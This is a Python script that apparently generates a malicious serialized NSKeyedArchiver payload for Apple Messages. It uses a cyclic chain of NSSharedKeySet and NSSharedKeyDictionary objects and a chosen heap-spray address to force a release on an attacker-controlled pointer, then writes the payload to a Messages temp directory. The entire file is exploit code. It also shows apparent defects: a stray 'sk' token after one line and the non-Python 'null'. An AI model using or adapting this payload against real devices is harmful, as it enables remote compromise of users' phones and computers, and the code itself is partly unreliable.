from base64 import b64encode, b64decode
from struct import pack, unpack
from nsarchiver import *
import sys

# Generate a payload that will cause an obj_release call on a pointer read from the given address
# which points into the heap spray

if len(sys.argv) < 2:
  print(f'Usage: {sys.argv[0]} address')
  exit(1)

address = int(sys.argv[1], 0)
assert(address % 8 == 0)
assert(address < 0x800000000)

value = ref(0)

shared_key_set_3 = ref({
  '$class': shared_key_set_class,
  'NS.M': 16,
  'NS.algorithmType': 1,
  'NS.factor': 3,
  'NS.g': b'\x00\x00\x00',
  'NS.keys': nsarray([ref(0)]),
  'NS.numKey': 1,
  'NS.rankTable': b'\x00' * 16,
  'NS.seed0': 206662775,
  'NS.seed1': 4261499435,
  'NS.select': 0,
  'NS.subskset': None
})

shared_key_dict_2 = ref({
  '$class': shared_key_dict_class,
  'NS.count': 1,
  'NS.keys': nsmutarray([ref(1337)]),sk
  'NS.sideDic': null,
  'NS.skkeyset': shared_key_set_3,
  'NS.values': nsarray([value])
})

pre_wrapper = nsarray([shared_key_dict_2])

wrapper = ref({
  '$class': ns_localized_string_class,
  'NS.originalString': ref('asdf'),
  'NS.configDict': pre_wrapper
})

shared_key_set_2 = ref({
  '$class': shared_key_set_class,
  'NS.M': 16,
  'NS.algorithmType': 1,
  'NS.factor': 3,
  'NS.g': b'\x00\x00\x00',
  'NS.keys': nsarray([ref(1337)]),
  'NS.numKey': 1,
  'NS.rankTable': b'\x00' * 16,
  'NS.seed0': 1234,
  'NS.seed1': 5678,
  'NS.select': 0,
  'NS.subskset': null
})

rank_table = pack('<I', 0xffffffff) * 4
shared_key_set_1 = ref({
  '$class': shared_key_set_class,
  'NS.M': 16,
  'NS.algorithmType': 1,
  'NS.factor': 3,
  'NS.g': b'\x00\x00\x00',
  'NS.keys': nsarray([wrapper]),
  'NS.numKey': (address // 8 - 1),
  'NS.rankTable': rank_table,
  'NS.seed0': 0x1337,
  'NS.seed1': 0x1337,
  'NS.select': 2,
  'NS.subskset': shared_key_set_2,
})

# Make the cycle here
shared_key_set_3.v['NS.subskset'] = shared_key_set_3

shared_key_dict_1 = ref({
  '$class': shared_key_dict_class,
  'NS.count': 1,
  'NS.keys': nsmutarray([ref(1337)]),
  'NS.sideDic': null,
  'NS.skkeyset': shared_key_set_1,
  'NS.values': nsarray([])
})

archiver = NSArchiver()
data = archiver.archive(shared_key_dict_1)

with open('/private/var/tmp/com.apple.messages/payload', 'w') as file:
  file.write(data)